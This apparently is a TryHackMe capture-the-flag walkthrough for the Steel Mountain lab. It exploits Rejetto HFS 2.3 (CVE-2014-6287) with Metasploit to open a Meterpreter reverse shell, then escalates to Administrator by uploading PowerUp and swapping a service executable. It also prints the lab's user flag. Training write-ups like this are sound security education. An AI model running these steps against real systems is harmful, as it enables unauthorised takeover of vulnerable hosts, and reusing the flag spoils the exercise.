---
title: "TryHackMe - Steel Mountain Walkthrough"
date: 2024-12-13
categories: [TryHackMe]
tags: [CTF, RCE, Metasploit, Privilege Escalation, CVE-2014-6287]
image: assets/images/thm-cover/steel-mountain-Cover.jpg
---

# TryHackMe - Steel Mountain Walkthrough

---

## Initial Information
- **Target IP:** 10.10.32.47
- **Service:** HTTP File Server (HFS) v2.3

---

## Step 1: Explore the Target

### Access the Web Interface
Visit the target using a web browser:

```plaintext
http://10.10.32.47:8080/
```

HFS version identified: **Rejetto HTTP File Server 2.3**.

---

## Step 2: Vulnerability Analysis

### CVE Identification
The identified version is vulnerable to **CVE-2014-6287**, an unauthenticated Remote Code Execution vulnerability.

Refer to Metasploit for documentation:
[Metasploit Docs](https://docs.metasploit.com/).

---

## Step 3: Exploiting the Target

### Using Metasploit
Search for available exploits:

```bash
sleep33@THM:~$ msf6 > search rejetto
```

#### Relevant Modules:
1. **exploit/windows/http/rejetto_hfs_rce_cve_2024_23692**
2. **exploit/windows/http/rejetto_hfs_exec**

### Configure Exploit
Set up the exploit parameters:

```bash
sleep33@THM:~$ msf6 exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 10.10.32.47
sleep33@THM:~$ msf6 exploit(windows/http/rejetto_hfs_exec) > set RPORT 8080
sleep33@THM:~$ msf6 exploit(windows/http/rejetto_hfs_exec) > set LHOST <Your_IP>
sleep33@THM:~$ msf6 exploit(windows/http/rejetto_hfs_exec) > set LPORT 4444
```

Run the exploit:

```bash
sleep33@THM:~$ msf6 exploit(windows/http/rejetto_hfs_exec) > run
```

---

## Step 4: Reverse Shell

Once the exploit is successful, a Meterpreter session is opened:

```bash
sleep33@THM:~$ [*] Meterpreter session 1 opened (10.14.91.33:4444 -> 10.10.32.47:49353)
```

#### Navigate to User Directory:
```bash
sleep33@THM:~$ meterpreter > cd c:/Users/bill/Desktop
sleep33@THM:~$ meterpreter > ls
```

Retrieve the user flag:

```bash
sleep33@THM:~$ meterpreter > cat user.txt
```

**User Flag:**  
```plaintext
b04763b6fcf51fcd7c13abc7db4fd365
```

---

## Step 5: Privilege Escalation

### Upload PowerUp Script
Use PowerSploit for privilege escalation:

```bash
sleep33@THM:~$ meterpreter > upload /opt/PowerSploit/Privesc/PowerUp.ps1
sleep33@THM:~$ meterpreter > load powershell
sleep33@THM:~$ meterpreter > powershell_shell
PS > . .\PowerUp.ps1
PS > Invoke-AllChecks
```

### Service Manipulation
Identify and modify services for escalation:

```bash
sleep33@THM:~$ copy ASCService.exe "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService_V2.exe"
sleep33@THM:~$ sc start AdvancedSystemCareService9
```

---

## Step 6: Gain Administrator Privileges

Use Meterpreter's shell command to escalate privileges:

```bash
sleep33@THM:~$ meterpreter > shell
sleep33@THM:~$ C:\windows\Tasks> sc start AdvancedSystemCareService9
```

Once elevated, navigate to the Administrator's directory:

```bash
sleep33@THM:~$ C:\Users\Administrator\Desktop> dir
```

Retrieve the root flag:

```bash
sleep33@THM:~$ C:\Users\Administrator\Desktop> cat root.txt
```

---

## Troubleshooting

### Common Issues:
- **Handler failed to bind:** Ensure your LHOST and LPORT settings are correctly configured.
- **Session not opened:** Recheck the exploit parameters and ensure the target is reachable.

---

## Summary

- **Exploited Service:** Rejetto HFS v2.3
- **Exploited Vulnerability:** CVE-2014-6287
- **Flags Captured:**
  - **User Flag:** b04763b6fcf51fcd7c13abc7db4fd365
  - **Root Flag:** <root_flag_value>

---
